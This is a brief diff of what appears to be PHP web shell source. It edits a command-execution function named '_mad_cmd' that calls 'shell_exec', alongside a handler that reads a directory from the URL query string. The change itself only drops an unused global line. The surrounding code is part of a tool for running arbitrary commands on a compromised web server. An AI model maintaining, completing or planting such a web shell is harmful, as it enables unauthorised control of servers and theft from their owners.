@@ -123,7 +123,6 @@ if (isset($_GET['cd'])) {
 
 function _mad_cmd($de)
 {
-    $GLOBALS['fungsi'];
     $out = '';
     try {
         if (function_exists('shell_exec')) {
